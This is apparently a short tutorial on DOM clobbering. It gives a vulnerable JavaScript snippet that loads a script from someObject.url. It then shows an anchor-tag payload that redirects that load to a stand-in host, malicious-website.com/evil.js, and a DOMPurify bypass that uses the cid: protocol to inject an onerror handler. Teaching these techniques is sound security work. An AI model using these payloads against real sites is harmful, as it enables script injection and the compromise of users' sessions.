DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and change the behavior of JavaScript on the page.
DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter.

example of vulnerable code:
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>

you can inject some html to clobber the someObject with an anchor element:

<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>

As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the someObject reference with this DOM collection. 
A name attribute is used on the last anchor element in order to clobber the url property of the someObject object, which points to an external script. 

DOM-Purify:
DOMPurify is filter you can use in an attempt to reduce DOM-based vulnerabilities. However, DOMPurify allows you to use the cid: protocol, which does not URL-encode double-quotes. 
This means you can inject an encoded double-quote that will be decoded at runtime:(you can use cid: in DOMPurify to encode " in href or otherb html elements)
<a id=yourID><a id=yourID name=yourName href="cid:&quot;onerror=alert(1)//">
